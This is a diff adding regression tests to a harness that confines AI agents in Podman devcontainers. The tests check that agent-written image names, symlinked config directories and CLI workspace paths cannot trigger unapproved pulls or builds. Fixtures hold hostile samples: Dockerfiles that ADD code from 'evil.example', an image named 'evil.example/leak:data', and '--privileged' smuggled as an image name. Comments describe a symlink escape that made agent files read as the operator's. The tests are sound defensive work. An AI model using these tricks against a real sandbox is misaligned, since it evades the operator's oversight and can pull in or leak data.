@@ -16,7 +16,7 @@ import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import {
-  BASE_IMAGE_REGISTRIES, EnvironmentError, acceptBuild, acceptedBuildsPath, buildArgv, buildDigest, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, loadAcceptedBuilds, parseProbe, probeScript, projectOf, resolveImage, runningServices, tagVersion, versionMatches,
+  BASE_IMAGE_REGISTRIES, EnvironmentError, IMAGE_REF, acceptBuild, acceptedBuildsPath, agentEditable, buildArgv, buildDigest, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, loadAcceptedBuilds, parseProbe, probeScript, projectOf, resolveImage, runningServices, tagVersion, versionMatches,
 } from "./environment.mjs";
 import { HarnessError, imageFor, run } from "./harness.mjs";
 import { detect } from "./sandbox.mjs";
@@ -251,6 +251,62 @@ const DEV = join(DEVDIR, "devcontainer.json");
     ok("projectOf follows the devcontainer convention", projectOf(DEV) === PROJ && projectOf(join(TMP, "flat", "devcontainer.json")) === join(TMP, "flat"));
     rmSync(DF);
   }
+  {
+    // Round 6: a name is a name. An image reference from the agent's file is
+    // held to the distribution grammar before anything is done with it.
+    const present = () => ({ status: 0 });
+    for (const good of ["docker.io/library/node:22-alpine", "localhost:5000/x", "ghcr.io/a/b@sha256:" + "0".repeat(64), "node", "my_app/svc-1:v1.2_3"]) ok(`image reference ${good} is accepted as a name`, IMAGE_REF.test(good) && resolveImage({ dev: { image: good }, devcontainerPath: DEV, workspace: PROJ, exec: present }).pull === "never");
+    for (const bad of ["--privileged", "evil.example/x y", "Node:22", "a\x1b[2Kb", "x:" + "t".repeat(129), "img:tag@sha256:short"]) {
+      ok(`image reference ${JSON.stringify(bad).slice(0, 30)} is REFUSED BY NAME, control bytes escaped`, (() => {
+        try {
+          resolveImage({ dev: { image: bad }, devcontainerPath: DEV, workspace: PROJ, exec: present });
+          return false;
+        } catch (e) {
+          return e.code === "IMAGE_NAME" && !/\x1b/.test(e.message);
+        }
+      })());
+    }
+  }
+  {
+    // Round 6: an agent-made `.devcontainer -> ../sibling/.devcontainer`
+    // landed outside the workspace by real path and read as the operator's.
+    // A path the agent can write to, by name, is the agent's.
+    const W = join(TMP, "ws-with-link");
+    const SIB = join(TMP, "sibling-ws", ".devcontainer");
+    mkdirSync(W, { recursive: true });
+    mkdirSync(SIB, { recursive: true });
+    writeFileSync(join(SIB, "Dockerfile"), "FROM docker.io/library/node:22-alpine\nADD https://evil.example/x /x\n");
+    symlinkSync(join(TMP, "sibling-ws", ".devcontainer"), join(W, ".devcontainer"));
+    const LDEV = join(W, ".devcontainer", "devcontainer.json");
+    const absent = (a) => ({ status: a[0] === "image" && a[1] === "exists" ? 1 : 0 });
+    ok("a symlinked .devcontainer inside the workspace by name is the agent's: its image is never pulled by the run", agentEditable(LDEV, W) && code(() => resolveImage({ dev: { image: "evil.example/leak:data" }, devcontainerPath: LDEV, workspace: W, exec: absent })) === "IMAGE_NOT_LOCAL");
+    ok("…and its build resolves outside the workspace's bound, so it is refused rather than read as the operator's", code(() => resolveImage({ dev: { build: { dockerfile: "Dockerfile" } }, devcontainerPath: LDEV, workspace: W, exec: absent })) === "BUILD_OUTSIDE_WORKSPACE");
+  }
+  {
+    // Round 6: the CLI, from a cwd that is an agent workspace, pointed at
+    // another --workspace, read the cwd's file. Now the file is the
+    // --workspace's, and the gate is the run's.
+    const A = join(TMP, "cli-ws-a");
+    const B = join(TMP, "cli-ws-b");
+    for (const d of [A, B]) mkdirSync(join(d, ".devcontainer"), { recursive: true });
+    writeFileSync(join(A, ".devcontainer", "devcontainer.json"), JSON.stringify({ build: { dockerfile: "Dockerfile" } }));
+    writeFileSync(join(A, ".devcontainer", "Dockerfile"), "FROM docker.io/library/node:22-alpine\nADD https://evil.example/leak /x\n");
+    writeFileSync(join(B, ".devcontainer", "devcontainer.json"), JSON.stringify({ image: "evil.example/leak:data" }));
+    const fake = join(TMP, "fake-podman-cli");
+    mkdirSync(fake, { recursive: true });
+    writeFileSync(join(fake, "podman"), "#!/bin/sh\necho \"$@\" >> \"$FAKE_PODMAN_LOG\"\nif [ \"$1\" = image ] && [ \"$2\" = exists ]; then exit 1; fi\nexit 0\n");
+    chmodSync(join(fake, "podman"), 0o755);
+    const log = join(TMP, "fake-podman-cli.log");
+    const env = { ...process.env, PATH: `${fake}:${process.env.PATH}`, FAKE_PODMAN_LOG: log, XDG_CONFIG_HOME: join(TMP, "xdg-cli") };
+    const fromA = spawnSync(process.execPath, [join(HERE, "environment.mjs"), "image", "--workspace", B], { cwd: A, encoding: "utf8", env });
+    ok("environment.mjs image --workspace B, run from A, reads B's devcontainer, not A's", /IMAGE_NOT_LOCAL/.test(fromA.stderr) && /evil\.example\/leak:data/.test(fromA.stderr) && !/BUILD_NOT_ACCEPTED/.test(fromA.stderr), fromA.stderr.slice(0, 300));
+    ok("…and no podman build ran for A's unaccepted Dockerfile", !existsSync(log) || !/^build/m.test(readFileSync(log, "utf8")), existsSync(log) ? readFileSync(log, "utf8") : "");
+    const inA = spawnSync(process.execPath, [join(HERE, "environment.mjs"), "image"], { cwd: A, encoding: "utf8", env });
+    ok("environment.mjs image in a workspace with an unaccepted Dockerfile is refused with the digest", /BUILD_NOT_ACCEPTED/.test(inA.stderr) && /--accept-build [0-9a-f]{64}/.test(inA.stderr) && (!existsSync(log) || !/^build/m.test(readFileSync(log, "utf8"))), inA.stderr.slice(0, 300));
+    const digest = /--accept-build ([0-9a-f]{64})/.exec(inA.stderr)?.[1];
+    const accepted = spawnSync(process.execPath, [join(HERE, "environment.mjs"), "image", "--accept-build", digest ?? "x"], { cwd: A, encoding: "utf8", env });
+    ok("…and with --accept-build it builds, from stdin, and records the acceptance in the operator's config dir", accepted.status === 0 && existsSync(log) && /^build .* -f - /m.test(readFileSync(log, "utf8")) && existsSync(join(TMP, "xdg-cli", "caretaker", "accepted-builds.json")), `${accepted.status} ${accepted.stderr.slice(0, 200)} ${existsSync(log) ? readFileSync(log, "utf8").slice(0, 200) : ""}`);
+  }
 
   const calls = [];
   const exec = (args) => {
@@ -472,6 +528,26 @@ ok("a fully matching environment has no differences", compare({ tools: [{ name: 
   const pj = (seen.find((a) => a[0] === "run") ?? []).join(" ");
   ok("the probe gets the preflight a run gets: a limit that cannot bind is dropped", !pj.includes("--cpus") && pj.includes("--memory"), pj);
   ok("…and said", pre.warnings.some((w) => /not limited on cpus/.test(w)), JSON.stringify(pre.warnings));
+}
+{
+  // Round 6: the probe is held to the pull rule too, and a test says so.
+  const P = join(TMP, "probe-pull");
+  mkdirSync(join(P, ".devcontainer"), { recursive: true });
+  const PDEV = join(P, ".devcontainer", "devcontainer.json");
+  writeFileSync(PDEV, JSON.stringify({ image: "docker.io/library/node:22-alpine" }));
+  const calls = [];
+  const fakeExec = (a) => {
+    calls.push(a);
+    if (a[0] === "run") return { status: 0, stdout: "" };
+    if (a[0] === "image" && a[1] === "inspect") return { status: 0, stdout: "sha256:feed\n" };
+    return { status: 0, stdout: "" };
+  };
+  const netns = { withRunEgress: async (opts, fn) => ({ result: await fn({ net: "n", extraRunFlags: [], env: {} }) }) };
+  await check({ devcontainerPath: PDEV, specs: [], exec: fakeExec, netns, egress: { egressNetwork: "podman" }, workspace: P, controllers: ["memory", "pids"] });
+  ok("check()'s probe runs an agent-named image with --pull=never when the devcontainer is the workspace's", (calls.find((a) => a[0] === "run") ?? []).includes("--pull=never"), JSON.stringify(calls.find((a) => a[0] === "run")));
+  calls.length = 0;
+  await check({ devcontainerPath: PDEV, specs: [], exec: fakeExec, netns, egress: { egressNetwork: "podman" }, workspace: join(TMP, "elsewhere"), controllers: ["memory", "pids"] });
+  ok("…and with podman's default when the devcontainer is the operator's, outside the workspace", !(calls.find((a) => a[0] === "run") ?? []).includes("--pull=never"));
 }
 {
   const r = spawnSync(process.execPath, [join(HERE, "environment.mjs"), "check", "--sandbox", "none", "--devcontainer", DEV, "--specs", join(TMP, "no-specs")], { encoding: "utf8", env: { ...process.env, PATH: `${BIN}:${process.env.PATH}` } });
